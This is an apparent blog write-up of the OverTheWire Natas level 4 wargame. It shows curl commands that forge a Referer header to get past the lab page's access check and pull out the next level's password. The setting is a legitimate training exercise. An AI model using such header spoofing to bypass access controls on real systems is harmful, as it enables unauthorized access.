---
title: "Over the wire - Natas4"
date: 2026-03-04T21:37:01+00:00
draft: false 
toc: false
images:
tags:
  - Over the wire
  - Natas
  - Curl
  - Linux
  - Web Security
---


First one where I had to use the browser to investigate. 

```bash
URL=http://natas4.natas.labs.overthewire.org

curl --user natas4:$(cat natas4 ) $URL
```

I got a message saying that: 
``` 
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

I was wondering what that Refresh page was about.
After clicking on the link, I got a message saying that:

``` 
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

That gave me the hint that I needed. I was supposed to use the Referer header to indicate that I was coming from natas5 url.
Proceeded to extract the password as usual.

```bash
URL_N5=http://natas5.natas.labs.overthewire.org

curl --user natas4:$(cat natas4 ) -H "Referer: "$URL_N5 $URL |
grep "natas5" | sed "s/.*is //"  > natas5
```

